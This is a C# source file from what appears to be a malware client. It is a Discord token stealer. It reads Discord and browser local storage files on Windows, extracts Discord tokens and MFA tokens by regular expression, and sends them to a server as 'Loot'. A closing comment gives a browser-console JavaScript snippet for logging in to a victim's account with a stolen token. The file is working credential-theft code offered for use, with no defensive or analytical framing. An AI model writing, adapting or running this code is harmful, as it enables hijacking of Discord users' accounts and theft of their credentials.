using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading.Tasks;

namespace Client.Armitage.Cookies
{
    public static class Discord_Token
    {
        /// <summary>
        /// Steals discord token from the Windows app.
        /// </summary>
        public static List<string> Stealu()
        {

            List<string> discordtokens = new List<string>();

            string[] paths = new string[] {
                // discord pc
                Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + @"\AppData\Roaming\Discord\Local Storage\leveldb",
                // discord canary
                Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + @"\AppData\Roaming\discordcanary\Local Storage\leveldb",
                 // discord ptb
                Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + @"\AppData\Roaming\discordptb\Local Storage\leveldb",
                // chromu
                Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + @"\AppData\Local\Google\Chrome\User Data\Default\Local Storage\leveldb",
                // opera, who tf uses this
                Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + @"\AppData\Roaming\Opera Software\Opera Stable",
            };
            foreach (string i in paths)
            {
                DirectoryInfo rootfolder = new DirectoryInfo(i);

                if (rootfolder.Exists)

                foreach (var file in rootfolder.GetFiles(false ? "*.log" : "*.ldb"))
                {
                    string readedfile = file.OpenText().ReadToEnd();

                    foreach (Match match in Regex.Matches(readedfile, @"[\w-]{24}\.[\w-]{6}\.[\w-]{27}"))
                        discordtokens.Add($"Token from {i}\r\n" + match.Value + "\n");

                    foreach (Match match in Regex.Matches(readedfile, @"mfa\.[\w-]{84}"))
                        discordtokens.Add($"Token from {i}\r\n" + match.Value + "\n");
                }
            }
            return discordtokens.ToList();
        }

        public static string GetTokenFromLogDir(string dir)
        {
            if (Directory.Exists(dir))
            {
                foreach (FileInfo file in new DirectoryInfo(dir).GetFiles())
                {
                    if (file.Extension.ToLower() == ".log")
                    {

                        string contents = File.ReadAllText(file.FullName);
                        if (contents.ToLower().Contains("oken"))
                        {
                            return contents;
                        }

                    }
                }
            }
            return null;
        }

        /// <summary>
        /// Sends the discord token to the server.
        /// </summary>
        public async static void Send()
        {
            await Task.Run(() => {
                var tokens = Stealu();
                // format the thing into a single string
                StringBuilder sb = new StringBuilder();
                foreach (var i in tokens) {
                    sb.AppendLine("==< Discord Tokens >==");

                    sb.AppendLine(i);
                }
                Communication.String_Stacker.Send(sb.ToString(), Communication.String_Stacker.StringType.Loot);
            });
        }

        /*
        To log in:
            Open Debug on browser.
                > function login(token) { setInterval(() => { document.body.appendChild(document.createElement `iframe`).contentWindow.localStorage.token = `"${token}"` }, 50); setTimeout(() => { location.reload(); }, 2500); }
                > login("token")
         */
    }
}
